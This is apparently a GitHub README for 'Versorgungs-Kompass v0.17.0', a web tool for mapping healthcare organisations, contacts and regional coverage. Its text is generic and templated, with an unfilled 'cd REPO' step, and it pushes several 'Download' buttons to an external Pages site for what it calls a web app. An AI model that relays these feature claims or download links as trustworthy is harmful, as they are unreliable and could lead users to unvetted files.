# Versorgungs-Kompass v0.17.0 - healthcare network mapping tool 2026

> **Versorgungs-Kompass is a web-based healthcare network mapping tool that helps teams visualize organizations, contacts, and regional coverage for hospitations, planning, and documentation in version 0.17.0.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.17.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevin-hayes1996/versorgungs-kompass-hub-v0170?style=flat-square)](https://github.com/kevin-hayes1996/versorgungs-kompass-hub-v0170)

---

<p align="center">
  <a href="https://kevin-hayes1996.github.io/versorgungs-kompass-hub-v0170/">
    <img src="https://img.shields.io/badge/Download-Versorgungs--Kompass%20Latest-brightgreen?style=for-the-badge" alt="Download Versorgungs-Kompass">
  </a>
</p>

> **[Direct Download - Versorgungs-Kompass v0.17.0](https://kevin-hayes1996.github.io/versorgungs-kompass-hub-v0170/)**

---

[Download Latest Build](https://kevin-hayes1996.github.io/versorgungs-kompass-hub-v0170/)

---

## Overview

Versorgungs-Kompass gives teams a clear, structured way to work with healthcare-related networks. It brings organizations, contacts, and appointment context into a single web application, which is especially useful for hospitations, coordination, events, and documentation-heavy planning tasks.

The app pairs map-driven views with documentation-oriented workflows, so users can examine regional reach, notice missing coverage, and capture next steps without switching tools. Because it includes a frontend login flow plus backend adapter support, it can be adapted to a range of deployment environments and operational setups.

---

## What it does

- Network overview for hospitations and related healthcare contexts
- Map-based visualization of organizations and contacts
- Planning support for appointments and documentation
- Regional analysis for coverage review and white-spot detection
- Frontend interface with login support
- Backend adapter structure for flexible integration
- Deployment options for GitHub Pages, Cloud Run, and Kubernetes
- Built around healthcare, medical, contacts, mapping, and network workflows

---

## Getting started

You can clone the repository or use the release package, then open the web app in the hosting environment you prefer.

```bash
git clone https://github.com/kevin-hayes1996/versorgungs-kompass-hub-v0170.git
cd REPO
```

For local or self-hosted deployments, launch the app according to the target platform you select. If you are publishing as a static site, deploy the generated frontend to your Pages or web server destination.

---

## How to use it

The application is meant to help you browse organizations on a map, inspect contacts, and document the background for visits or meetings.

Typical workflow:

1. Sign in through the frontend login.
2. Open the network view to inspect organizations and contacts.
3. Review appointments or hospitation notes.
4. Check regional coverage to spot areas with limited visibility.
5. Export or document findings as needed within your deployment setup.

For team use, keep the dataset current so mapping and planning remain useful over time.

---

## Configuration

What you configure depends on the deployment style and the backend services you connect to.

A typical setup may include:

```ini
SUPABASE_URL=your-supabase-url
SUPABASE_ANON_KEY=your-supabase-key
APP_ENV=production
```

If you deploy with Kubernetes or Cloud Run, place environment values in the relevant manifests or service settings. For GitHub Pages, configuration is usually applied during build time or through static app settings.

---

## Requirements

- Web browser support
- A hosting target such as GitHub Pages, Cloud Run, or Kubernetes
- Optional Supabase access for backend-connected deployments
- Basic storage for application data, depending on your chosen setup
- Network access for map, contact, and backend resources used by your deployment

---

## Common questions

**How do I get updates?**  
Use the latest release or rebuild from the current repository state when you need a newer version.

**Where do I change settings?**  
Check your environment variables, deployment manifests, or app configuration files, depending on the target platform.

**Can I deploy it without Kubernetes?**  
Yes. The available deployment paths include GitHub Pages and Cloud Run in addition to Kubernetes.

**What if the map or login does not load?**  
Confirm that the hosting environment is serving the app correctly and that any backend adapter or Supabase values are set as expected.

**Is there support for different environments?**  
The project is structured to work across multiple deployment models, so you can adapt it to the environment that matches your workflow.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
